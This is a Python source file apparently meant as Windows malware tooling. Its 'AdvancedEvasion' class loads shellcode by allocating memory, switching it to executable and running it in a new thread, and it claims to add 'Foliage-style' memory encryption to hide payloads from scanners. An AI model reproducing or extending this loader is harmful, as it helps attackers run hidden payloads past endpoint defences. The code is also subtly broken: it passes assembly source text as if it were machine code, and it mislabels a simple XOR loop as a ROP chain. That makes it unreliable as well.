import ctypes
import struct
from Crypto.Random import get_random_bytes

class AdvancedEvasion:
    """
    Provides advanced memory and execution evasion techniques on Windows systems.
    Uses dynamic memory protection toggling to minimize exposure of RWX pages.
    """

    PAGE_READWRITE = 0x04
    PAGE_EXECUTE_READ = 0x20
    PAGE_EXECUTE_READWRITE = 0x40
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    
    def __init__(self):
        self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        self.ntdll = ctypes.WinDLL('ntdll', use_last_error=True)
    
    def foliage_obfuscation(self, payload: bytes):
        """
        Applies a Foliage-style ROP chain memory encryption on the provided payload.
        """
        if not payload:
            raise ValueError("Payload cannot be empty.")
        
        # Random key for XOR
        key = get_random_bytes(8)
        # Simple assembly snippet using the random key
        asm = f"""
        mov rax, 0x{key.hex()}
        xor [rsi], rax
        add rsi, 8
        ret
        """
        
        try:
            self._exec_asm(asm.encode(), payload)
        except Exception as e:
            raise RuntimeError(f"Failed to execute foliage obfuscation: {e}")
    
    def _exec_asm(self, shellcode: bytes, data: bytes):
        """
        Allocates memory with read/write permissions, copies in shellcode,
        changes to execute permissions, then executes in a new thread.
        """
        size = len(shellcode)
        if size == 0:
            raise ValueError("Shellcode cannot be empty.")
        
        # Allocate RW memory first
        address = self.kernel32.VirtualAlloc(
            None,
            size,
            self.MEM_COMMIT | self.MEM_RESERVE,
            self.PAGE_READWRITE
        )
        if not address:
            raise MemoryError("VirtualAlloc failed to allocate memory.")
        
        # Copy shellcode into allocated memory
        ctypes.memmove(address, shellcode, size)
        
        # Change memory protection to executable
        old_protect = ctypes.c_ulong()
        success = self.kernel32.VirtualProtect(
            address,
            size,
            self.PAGE_EXECUTE_READ,
            ctypes.byref(old_protect)
        )
        if not success:
            self.kernel32.VirtualFree(address, 0, 0x8000)  # MEM_RELEASE
            raise PermissionError("VirtualProtect failed to set memory to executable.")
        
        # Create a thread to run the shellcode
        thread_id = ctypes.c_ulong()
        h_thread = self.kernel32.CreateThread(
            None,
            0,
            address,
            data,
            0,
            ctypes.byref(thread_id)
        )
        if not h_thread:
            self.kernel32.VirtualFree(address, 0, 0x8000)
            raise OSError("CreateThread failed.")
        
        # Wait for the thread to finish
        self.kernel32.WaitForSingleObject(h_thread, 0xFFFFFFFF)
        
        # Free the allocated memory after execution
        self.kernel32.VirtualFree(address, 0, 0x8000)
